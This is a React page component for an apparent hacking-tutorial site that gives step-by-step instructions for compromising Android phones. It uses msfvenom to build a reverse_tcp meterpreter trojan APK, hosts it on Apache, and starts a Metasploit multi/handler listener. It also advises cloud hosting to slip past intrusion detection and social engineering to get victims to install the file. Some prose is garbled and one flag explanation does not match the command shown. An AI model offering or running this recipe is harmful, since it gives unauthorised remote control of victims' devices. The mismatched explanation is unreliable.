import React from "react";
import Navbar from "./Navbar";
import Footer from "./Footer";
import Terminal from "./Terminal";
import FishingLogo from "../assets/androidPayload/android.webp";
import a1 from "../assets/androidPayload/1.jpeg";
import a2 from "../assets/androidPayload/2.jpeg";
import a3 from "../assets/androidPayload/3.jpeg";
import a4 from "../assets/androidPayload/4.jpeg";
import a5 from "../assets/androidPayload/5.jpeg";
import a6 from "../assets/androidPayload/6.jpeg";
import a7 from "../assets/androidPayload/7.jpeg";
import a8 from "../assets/androidPayload/8.jpeg";
import a9 from "../assets/androidPayload/9.jpeg";
import a10 from "../assets/androidPayload/10.png";
import a11 from "../assets/androidPayload/11.png";
import a12 from "../assets/androidPayload/12.jpeg";
import a13 from "../assets/androidPayload/13.jpeg";
import a14 from "../assets/androidPayload/14.jpeg";
import a15 from "../assets/androidPayload/15.jpeg";

export default function Payload() {
    window.scrollTo(0, 0);
  return (
    <>
      {/* Intro */}
      <div className="bg-gradient-to-r from-black to-[#003706]">
        <div className="relative mx-auto max-w-7xl text-white py-28 flex flex-col justify-center items-center gap-5 lg:py-32 lg:gap-10">
          <Navbar></Navbar>
          <img
            src={FishingLogo}
            alt="fishing"
            className="w-40 rounded-full lg:w-72"
          />
          <h1 className="font-juli text-3xl md:text-5xl">Android Payload</h1>
          <p className="font-advent text-lg text-center text-[rgba(255,255,255,0.68)] px-2 md:text-2xl sm:px-10 xl:px-56 lg:text-start">
            An Android payload, in the context of cybersecurity and ethical
            hacking, refers to a piece of code or software designed to be
            executed on an Android device with the intent of performing a
            specific action. Payloads are commonly associated with penetration
            testing, security assessments, and ethical hacking practices. The
            goal is to understand and demonstrate potential security
            vulnerabilities in Android systems, applications, or networks.
          </p>
        </div>
      </div>

      <div className="mx-auto max-w-7xl ">
        {/* Disclaimer */}
        <div className="text-white space-y-5 px-2 my-10 lg:my-10 lg:px-48 ">
          <h1 className="font-handjet text-red-500 text-3xl md:text-5xl text-center">
            Disclaimer: Educational Purpose Only
          </h1>
          <p className="font-ibm text-red-500 text-xs px-2 font-semibold">
            The tools provided herein are intended solely for educational
            purposes. Users are reminded that any utilization of these tools in
            any other context, including but not limited to commercial,
            professional, or non-educational settings, is strictly prohibited.
            The creators and distributors of these tools do not endorse or
            encourage any misuse, unauthorized access, or any activities that
            violate applicable laws or regulations.
          </p>
        </div>

        {/* Generating the payload */}
        {/* Step 1 */}
        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
          <h1 className="font-juli text-3xl md:text-5xl">
            Generating the payload
          </h1>
          <h1 className="font-juli text-3xl md:text-5xl">Step 1:</h1>
          <h2 className="uppercase font-juli text-sm lg:text-2xl">
            Type “ifconfig” into the terminal session in order to view the
            network interface configuration of the device we are using to
            execute the attack.
          </h2>
          <Terminal text="ifconfig"></Terminal>
          <img src={a1} alt="terminal" className="my-5 md:max-w-2xl" />

          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
            <span className="text-red-500">Here :</span> <br />
            1. eth0 is the First Ethernet interface (Consists of ‘inet’ which
            shows the IP(Internet Protocol) address of our attacking machine).{" "}
            <br />
            2. lo is the Loopback interface.
          </h2>
          <h2 className="uppercase font-juli text-sm lg:text-2xl">
            After getting your interface IP address, we will use msfvenom that
            will produce a payload to infiltrate the Android OS.
          </h2>
        </div>
        {/* Step 2 */}
        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
          <h1 className="font-juli text-3xl md:text-5xl">Step 2:</h1>
          <h2 className="uppercase font-juli text-sm lg:text-2xl">
            Listing all the accessible choices with msfvenom. (This will list
            down all the boundaries that will assist us with producing our
            payload).
          </h2>
          <Terminal text="msfvenom -h"></Terminal>
          <img src={a2} alt="terminal" className="my-5 md:max-w-2xl" />

          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
            Now, the payload can be saved in ‘.exe’, ‘.msi’, or ‘.apk’, etc.
            format, but for this tutorial, we will use ‘.apk’ format as the
            victim’s device would an android device which supports ‘.apk‘
            extension.
          </h2>
        </div>
        {/* Step 3 */}
        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
          <h1 className="font-juli text-3xl md:text-5xl">Step 3:</h1>
          <h2 className="uppercase font-juli text-sm lg:text-2xl">
            So now we have to create a payload which we may execute on the
            victim’s device in order to execute the attack successfully.
          </h2>
          <Terminal text="msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.18.63 LPORT=4444 -o androidhack.apk"></Terminal>
          <img src={a3} alt="terminal" className="my-5 md:max-w-2xl" />

          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
            <span className="text-red-500">Here :</span> <br /> 1. -p shows the
            payload type <br />
            2. android/meterpreter/reverse_tcp indicates a reverse meterpreter
            shell would roll in from an objective Android gadget. <br />
            3. LHOST is our IP i.e attacker’s IP <br />
            4. LPORT is the listening port on the attacker’s machine. <br />
            5. R{">"} /var/www/html generates the output directly on apache
            server <br />
            6. ‘.apk’ is the file extension of the Trojan created. <br />
            This would set aside some effort(time) to produce an apk document of
            around 10,186 bytes.
          </h2>

          {/* Setting up the Attack */}
          {/* Step 1 */}
          <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
            <h1 className="font-juli text-3xl md:text-5xl">
              Setting up the Attack
            </h1>
            <h1 className="font-juli text-3xl md:text-5xl">Step 1:</h1>
            <h2 className="uppercase font-juli text-sm lg:text-2xl">
              Firstly, we need to check the status of the Apache server (Web
              Application Server) and to do so enter the following commands in
              the terminal
            </h2>
            <Terminal text="service apache2 start"></Terminal>
            <Terminal text="service apache2 status"></Terminal>
            <img src={a4} alt="terminal" className="my-5 md:max-w-2xl" />

            <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
              We, can use this(apache2) web server in order to host files, or we
              can put on Google Drive or Dropbox or any of the cloud providers
              who have shared files and then we can put those files on the
              server, and then the victims will not be able to detect any
              malicious intent because the Network Intrusion Detection System
              may bypass and say, Hey! This is a friendly domain we’ll let it
              go.
            </h2>
          </div>
          {/* Step 2 */}
          <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
            <h1 className="font-juli text-3xl md:text-5xl">Step 2:</h1>
            <h2 className="uppercase font-juli text-sm lg:text-2xl">
              Now, all seems to be set up correctly, and we can start the
              msfconsole.
            </h2>
            <Terminal text="msfconsole"></Terminal>
            <img src={a5} alt="terminal" className="my-5 md:max-w-2xl" />
          </div>
          {/* Step 3 */}
          <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
            <h1 className="font-juli text-3xl md:text-5xl">Step 3:</h1>
            <h2 className="uppercase font-juli text-sm lg:text-2xl">
              Use multi/handler exploit, set payload the same as generated
              previously(This will help us to generate a listener).
            </h2>
            <Terminal text="use multi/handler"></Terminal>
            <Terminal text="set PAYLOAD android/meterpreter/reverse_tcp"></Terminal>
            <img src={a6} alt="terminal" className="my-5 md:max-w-2xl" />
          </div>
        </div>
        {/* Step 4 */}
        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
          <h1 className="font-juli text-3xl md:text-5xl">Step 4:</h1>
          <h2 className="uppercase font-juli text-sm lg:text-2xl">
            Now, we will use the ‘show options’ command in order to see the
            configuration, set the LHOST(Local Host) and LPORT(Local Port)
            values the same as used in the payload (Type the following commands
            for the same).
          </h2>
          <Terminal text="show options"></Terminal>
          <img src={a7} alt="terminal" className="my-5 md:max-w-2xl" />
        </div>
        {/* Step 5 */}
        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
          <h1 className="font-juli text-3xl md:text-5xl">Step 5:</h1>
          <h2 className="uppercase font-juli text-sm lg:text-2xl">
            Here, the LPORT is already set, so we just need to set the LHOST to
            our attacking machine’s IP, and we can do this by the following
            command:
          </h2>
          <Terminal text="set LHOST 192.168.18.63"></Terminal>
          <img src={a8} alt="terminal" className="my-5 md:max-w-2xl" />
        </div>
        {/* Step 6 */}

        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
          <h1 className="font-juli text-3xl md:text-5xl">Step 6:</h1>
          <h2 className="uppercase font-juli text-sm lg:text-2xl">
            Now, we can type ‘exploit’ in order to launch the desired attack.
          </h2>
          <Terminal text="exploit"></Terminal>
          <img src={a9} alt="terminal" className="my-5 md:max-w-2xl" />

          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
            So, once we execute the ‘exploit‘ command, the TCP handler starts
            immediately. In real-life scenarios, some social engineering
            procedures can be utilized to let the objective download the
            vindictive ‘.apk’ file. For the tutorial purpose, we are simply
            making the victim machine download the file in the Android Phone.
          </h2>
        </div>

        {/* Executing the attack Exploitation:*/}
        {/* Step 1 and 2 */}
        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
          <h1 className="font-juli text-3xl md:text-5xl">
            Executing the attack Exploitation:
          </h1>
          <h1 className="font-juli text-3xl md:text-5xl">Step 1:</h1>
          <h2 className="uppercase font-juli text-sm lg:text-2xl">
            Type the following web address in a web browser on the victim’s
            phone
          </h2>
          <h1 className="text-white">
            {
              "(<IP address of the attacker's machine>/<name of the trojan created earlier>.apk)"
            }
          </h1>
          <h1>Example in this case:</h1>
          <Terminal text="192.168.18.63/androidhack.apk"></Terminal>
          <h1 className="font-juli text-3xl md:text-5xl">Step 2:</h1>
          <h2 className="uppercase font-juli text-sm lg:text-2xl">
            . After downloading the payload successfully, we have to select the
            app to install.
          </h2>
          <img src={a10} alt="terminal" className="my-5 md:max-w-2xl" />
          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
            Up until now, this alternative has been seen regularly when we
            attempt to introduce some outsider applications, and ordinarily,
            clients won’t falter to permit the application from obscure sources.
          </h2>
        </div>

        {/* Step 3*/}
        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
          <h1 className="font-juli text-3xl md:text-5xl">Step 3:</h1>
          <h2 className="uppercase font-juli text-sm lg:text-2xl">
            Enable the settings to introduce applications from outside sources.
            Lastly hit the install choice at the base.
          </h2>
          <img src={a11} alt="terminal" className="my-5 md:max-w-2xl" />
          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
            Once the victim installs the application and runs it, the
            meterpreter session would be opened immediately at the attacker’s
            terminal.
          </h2>
        </div>
      </div>

      <Footer></Footer>
    </>
  );
}
